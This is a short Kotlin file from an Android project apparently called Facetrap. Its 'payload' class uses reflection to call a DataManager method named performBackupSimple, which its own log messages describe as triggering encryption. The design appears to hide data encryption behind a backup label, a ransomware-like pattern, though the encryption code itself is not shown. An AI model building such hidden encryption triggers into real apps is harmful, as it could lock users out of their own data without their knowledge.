package com.facetrap.payload

import android.content.Context
import android.util.Log

class EncryptPayload {

    fun execute(context: Context) {
        Log.d("Facetrap", "Payload executing – calling encryption via reflection")

        try {
            val dataManagerClass = Class.forName("com.facetrap.DataManager")

            // Get the singleton instance (object)
            val instanceField = dataManagerClass.getDeclaredField("INSTANCE")
            val instance = instanceField.get(null)

            val method = dataManagerClass.getDeclaredMethod(
                "performBackupSimple",
                Context::class.java
            )
            method.invoke(instance, context)

            Log.d("Facetrap", "Encryption triggered successfully via payload")

        } catch (e: Exception) {
            Log.e("Facetrap", "Failed to invoke DataManager.performBackupSimple", e)
        }
    }
}